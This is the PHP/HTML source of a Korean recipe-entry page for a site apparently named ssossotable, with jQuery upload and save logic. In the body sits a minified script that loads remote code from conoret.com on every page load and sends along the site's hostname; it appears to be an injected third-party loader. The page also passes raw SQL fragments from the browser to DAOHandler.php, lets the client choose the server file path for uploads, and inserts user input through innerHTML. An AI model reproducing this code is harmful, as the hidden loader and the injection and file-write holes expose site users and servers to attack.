<!DOCTYPE html>
<?php
include 'script/modules/CookieManager.php';
(CookieManager::factory())->refreshCookie();
?>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://getbootstrap.com/docs/5.2/assets/css/docs.css" rel="stylesheet">
    <title>레시피 기록하기</title>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"></script>

    <link rel="icon" href="src/favicon.ico">

    <style>
        @font-face { /* 애플산돌고딕 폰트 적용 */
            font-family: "Jua";
            src: url("css/font/Jua-Regular.ttf") format("truetype");
            font-weight: normal;
        }
    </style>
    <link rel="stylesheet" href="/css/footer.css">
    <link rel="stylesheet" href="/css/header.css">
    <link rel="stylesheet" href="/css/recipe.css">

    <script
        src="https://code.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
        crossorigin="anonymous"></script>
    <script>
        let key_flag=false
        // [전역 변수 관리]
        var bodyHeightOriginalSize = "";
        var bodyHeightChangeSize = "";

        // [dom 생성 및 이벤트 상시 대기 실시]
        document.addEventListener("DOMContentLoaded", ready);
        function ready(){
            console.log("");
            console.log("[window ready] : [start]");
            console.log("");
        }

        // [html 최초 로드 및 이벤트 상시 대기 실시]
        window.onload = function() {
            console.log("");
            console.log("[window onload] : [start]");
            console.log("");
            // [브라우저 초기 로드 시 가상 키보드 비활성 상태 인 Height 값 저장 실시]
            bodyHeightOriginalSize = document.body.clientHeight;
        };

        // [html 화면 사이즈 변경 이벤트 감지]
        window.onresize = function() {
            console.log("");
            console.log("[window onresize] : [start]");
            console.log("");

            // [실시간 변경 된 Height 값 저장 실시]
            bodyHeightChangeSize = document.body.clientHeight;

            console.log("");
            console.log("[window onresize] : [body 높이 값 확인 실시]");
            console.log("[bodyHeightOriginalSize] : [원본] : " + bodyHeightOriginalSize);
            console.log("[bodyHeightChangeSize] : [변경] : " + bodyHeightChangeSize);
            console.log("");

            // [접속 한 디바이스 확인 실시]
            var uagent = navigator.userAgent.toLowerCase();
            var android_agent = uagent.search("android");
            var iphone = uagent.search("iphone");
            var ipad = uagent.search("ipad");

            // [접속 한 디바이스가 안드로이드 인 경우]
            if (android_agent > -1) {
                // [원본 사이즈와 변화된 사이즈가 같은 경우 : 가상 키보드 비활성 상태]
                if (bodyHeightOriginalSize == bodyHeightChangeSize){ // [원본 사이즈와 변화된 사이즈가 같은 경우 : ]

                    console.log("");
                    console.log("[window onresize] : [가상 키보드 비활성]");
                    console.log("");
                }
                // [원본 사이즈와 변화된 사이즈가 다른 경우 : 가상 키보드 활성 상태]
                else {

                    console.log("");
                    console.log("[window onresize] : [가상 키보드 활성]");
                    console.log("");

                }
            }
        };
    </script>
    <script type="text/javascript">
        let mql = window.matchMedia("screen and (max-width: 768px)");
        let flag=false;
        mql.addListener(function(e) {
            if(e.matches) {
                // 모바일
                flag=true
            } else {
                // 데스크탑
                flag=false
            }
        });
        let file=null
        let formData = new FormData();
        let filePath=``
        let fileName=``
        let foodName=``
        let foodNameArray=null
        let foodNameArrayString=``
        function init() {
            if(mql.matches) {
                // 모바일
                flag=true;
            }
            else {
                // 데스크톱
                flag=false
            }
            const preview = document.getElementById("preview"),
                fileElem = document.getElementById("fileElem");

            preview.addEventListener("click", function (e) {
                if (fileElem) {
                    fileElem.click();
                }
            }, false);
        }
        function food_name_modify() {
            let utf8Encode = new TextEncoder();
            let utf8Decode = new TextDecoder()

            const foodName=document.getElementById('food-name-modify-input').value
            foodNameArrayString=utf8Encode.encode(foodName).toString()
            foodNameArray=foodNameArrayString.split(',')
            // let arrayBuffer=new Uint8Array(foodNameArrayString)
            // console.log(arrayBuffer)
            // console.log(utf8Decode.decode(arrayBuffer))
            document.getElementById('food-name-modify-input').value=''
            if(foodName !== '') {
                document.getElementById('food-name').innerText=foodName
            }
        }
        function add_recipe() {
            let recipeContent=document.getElementById('recipe-input').value
            let format=``
            if(recipeContent!=='') {
                format=`
                <li>
                    <span class="recipe-content">${recipeContent}</span>
                    <span><img src='src/close.png' width="20px" height="20px"/></span>
                </li>
                `
                document.getElementById('recipe-list').innerHTML+=format
                document.getElementById('recipe-input').value=''
            }
        }
        async function handleFiles(files) {
            let postJson={}
            const preview=document.getElementById("preview")

            for (let i = 0; i < files.length; i++) {
                file = files[i];
                if (!file.type.startsWith('image/')){ continue }

                const img = document.createElement("img");
                img.classList.add("obj");
                img.file = file;

                img.width=240
                img.height=240

                preview.innerHTML=``
                preview.appendChild(img); // "preview"가 결과를 보여줄 div 출력이라 가정.

                const reader = new FileReader();
                reader.onload = (function(aImg) { return function(e) { aImg.src = e.target.result; }; })(img);
                reader.readAsDataURL(file);
            }
        }
        async function commit() {
            const tag=document.getElementsByClassName('recipe-content')
            const foodName=document.getElementById('food-name').innerText
            const memo=document.getElementById('recipe-memo').value
            let tags=``
            for(let i=0;i<tag.length;i++) {
                if(i===tag.length-1) {
                    tags+=tag[i].innerText
                }
                else {
                    tags+=tag[i].innerText+'|'
                }
            }
            if(file===null) {
                await $.ajax({
                    type: "POST",
                    url: '/script/php/DAOHandler.php',
                    data: {
                        0:'insert',
                        1:'recipe(userid,foodname,memo,tags)',
                        2:`<?php echo $_COOKIE['user_id']; ?>, '${foodName}', '${memo}', '${tags}'`
                    }})
            }
            else {
                const idx=(file.name).indexOf('.')
                fileName=`<?php echo $_COOKIE['user_id']; ?>-${foodNameArrayString}.${(file.name).substring(idx+1)}`
                filePath=`/var/www/html/config/recipeImages/${fileName}`
                formData.append("filePath", filePath);
                formData.append("image", file);
                await $.ajax({
                    type: "POST",
                    url: '/script/php/DAOHandler.php',
                    data: {
                        0:'insert',
                        1:'recipe(userid,foodname,memo,tags,image)',
                        2:`<?php echo $_COOKIE['user_id']; ?>, '${foodName}', '${memo}', '${tags}', 'http://ssossotable.com/config/recipeImages/${fileName}'`
                    }})
                await $.ajax({
                    type:"POST",
                    url: "/script/php/FileHandler.php",
                    processData: false,
                    contentType: false,
                    data: formData
                })
            }
            location.reload()
        }
    </script>
    <script type="text/javascript" src="/script/javascript/modules.js"></script>
</head>

<body class="text-center vsc-initialized" cz-shortcut-listen="true">
<script type="text/javascript">
</script>
<script type="text/javascript">
    window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();

</script>
<div class="cover-container d-flex h-100 p-3 mx-auto flex-column">
    <nav class="navbar d-flex">
        <a class="navbar-brand p-2" href="http://ssossotable.com/recommendation" style="margin-right: auto;"><img class="masthead-brand" src="src/logo.png" width="64px" height="64px"></a>
        <a class="nav-link text-muted p-2" href="http://ssossotable.com/rating">음식 평가하기</a>
        <a class="nav-link active p-2" href="http://ssossotable.com/recipe">레시피 추가하기</a>
        <a class="nav-link text-muted p-2" href="http://ssossotable.com/record">식사 기록하기</a>
        <button style="margin: 10px;" class="navbar-toggler p-2" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavbar" aria-controls="offcanvasNavbar">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasNavbar" aria-labelledby="offcanvasNavbarLabel">
            <div class="offcanvas-header">
                <a  class="offcanvas-title" href="http://ssossotable.com/recommendation.php"><img class="masthead-brand" src="src/logo.png" width="48px" height="48px"></a>
                <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
            </div>
            <div class="offcanvas-body">
                <ul class="navbar-nav justify-content-end flex-grow-1 pe-3" style="text-align: left;">
                    <li class="nav-item">
                        <a class="nav-link " href="http://ssossotable.com/my_info">내 정보</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/friends">친구 목록</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/diary">다이어리</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="http://ssossotable.com/my_recipe">나만의 레시피북</a>
                    </li>
                </ul>
                <div class="input-group mb-3 mt-3">
                    <input id="search" type="text" class="form-control" placeholder="음식명을 넣어주세요" aria-label="Recipient's username" aria-describedby="button-addon2">
                    <button onclick="search()" class="btn btn-outline-secondary" type="button" id="button-addon2">검색</button>
                </div>
            </div>
        </div>
    </nav>
    <main role="main" class="inner cover d-flex" id="rating-main">
        <div class="card d-flex flex-column align-items-center justify-content-center" style="overflow-y:auto; width: 100%; height: 100%;">
            <div id="recipe-image" class="d-flex justify-content-center">
                <div class="box" id="preview"><img class="food-image card-img-top" src="src/food_placeholder.png"alt="..."></div>
                <input type="file" id="fileElem" multiple accept="image/*" style="display:none" onchange="handleFiles(this.files)">
            </div>
            <div id="recipe-title" class="mb-3" >
                <h1 class="card-title"><label for="exampleFormControlInput1" class="form-label" id="food-name">음식명</label></h1>
                <div class="input-group mb-3">
                    <input id="food-name-modify-input" type="text" class="form-control" placeholder="뭘 먹었나요?" aria-label="Recipient's username" aria-describedby="button-addon2">
                    <button class="btn btn-outline-secondary" type="button" onclick="food_name_modify();" id="food-name-modify">입력</button>
                </div>
            </div>
            <div id="recipe-contents" style="display: none">
                <div class="align-middle" id="recipe-textarea-div">
                    <div class="mb-3">
                        <textarea class="form-control" placeholder="메모를 남겨주세요" id="recipe-memo" rows="7"></textarea>
                    </div>
                    <input type="button" value="저장하기" onclick="commit();" class="w-100 btn" style="background-color:#e4bd74; color:white;">
                </div>
            </div>
        </div>
        <div class="card d-flex flex-column align-items-center justify-content-center" id='recipe-info' style="width: 100%; height: 100%; background-color: transparent;">
            <div class="align-middle" id="title" style="width: 80%;">
                <div class="mb-3">
                    <textarea class="form-control" placeholder="메모를 남겨주세요" id="recipe-memo" rows="10"></textarea>
                </div>
                <br>
                <input type="button" value="저장하기" onclick="commit();" class="w-100 btn" style="background-color:#e4bd74; color:white;">
            </div>
        </div>
    </main>

    <?php (LayoutHandler::factory())->createFooter(); ?>
    <script>
        init()
    </script>
</div>
</body>
</html>